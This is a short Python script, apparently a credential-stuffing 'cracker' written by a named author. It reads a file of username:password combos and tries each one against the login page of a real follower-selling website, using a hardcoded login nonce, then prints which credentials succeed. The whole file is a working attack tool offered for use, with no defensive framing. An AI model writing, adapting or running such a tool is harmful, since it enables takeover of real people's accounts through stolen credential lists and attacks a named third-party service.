#Written by 《ERFAN》
#t.me/ErfanMAfshar

import requests,os

os.system('pip install requests')
os.system('clear')
print("|-----------------------------------|")
print("|                                   |")
print("|  [+]TheBestFollowers Cracker      |")
print("|  [+]Combo Type:(user/email:pass)  |")
print("|  [+]Buy Instagram Followers       |")
print("|                                   |")
print("|___________________________________|")

def pyGreen(skk) : print("\033[92m {}\033[00m".format(skk))
def pyRed(skk) : print("\033[91m {}\033[00m".format(skk))

combo = input("Enter Combo: ")

with open(combo, 'r') as combo:
        ss = combo.read()
        qq = ss.splitlines()
        print("Start Cracking...\n")
        for email_pass in qq:
                username = email_pass.split(':')[0]
                password = email_pass.split(':')[1]
                payload = {'username':str(username),
                           'password':str(password),
                           'woocommerce-login-nonce':'87e1ab7814',
                           '_wp_http_referer':'/my-account/',
                           'login':'Log in'}
                sess = requests.session()
                Post = sess.post('https://www.thebestfollowers.co.uk/my-account/', data=payload)
                if b"Dashboard" in Post.text.encode('utf-8'):
                        pyGreen("Success ---> " + username + ":" + password)
                else:
                        pyRed("Wrong ---> " + username + ":" +password)
        print("\nDone")
